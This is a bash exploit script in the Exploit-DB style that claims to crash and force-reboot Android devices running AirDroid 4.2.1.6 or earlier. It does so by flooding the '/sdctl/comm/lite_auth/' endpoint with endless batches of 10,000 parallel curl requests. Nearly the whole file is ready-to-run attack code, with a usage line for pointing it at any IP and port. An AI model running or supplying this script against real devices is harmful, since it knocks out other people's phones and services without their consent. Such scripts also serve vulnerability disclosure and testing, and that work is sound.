#!/bin/bash

# *********************************************************************
# *             Author: Marcelo Vázquez (aka s4vitar)                 *
# *  AirDroid Denial of Service (DoS) & System Crash + Forced Reboot  *
# *********************************************************************

# Exploit Title: AirDroid Remote Denial of Service (DoS) & System Crash + Forced Reboot
# Date: 2019-02-13
# Exploit Author: Marcelo Vázquez (aka s4vitar)
# Collaborators: Victor Lasa (aka vowkin)
# Vendor Homepage: https://web.airdroid.com/
# Software Link: https://play.google.com/store/apps/details?id=com.sand.airdroid&hl=en
# Version: <= AirDroid 4.2.1.6
# Tested on: Android

url=$1 # Example: http://192.168.1.46:8888
requests=0

trap ctrl_c INT

# If Ctrl+C key is pressed then the threads are killed
function ctrl_c() {
        echo -e "\n\n[*]Exiting...\n" && tput cnorm
        pkill curl > /dev/null 2>&1
        exit
}

# Detect number of arguments being passed to the program
if [ "$(echo $#)" == "1" ]; then
	# Infinite Loop
	tput cnorm && while true; do
		# We send 10000 requests in thread
		for i in $(seq 1 10000); do
			curl --silent "$url/sdctl/comm/lite_auth/" &
			let requests+=1
		done && wait # Here we wait for the threads to finish
	echo "Requests Sent: $requests"
	done
else
	echo -e "\nUsage: ./AirDroid_request.sh http://ip:port\n"
fi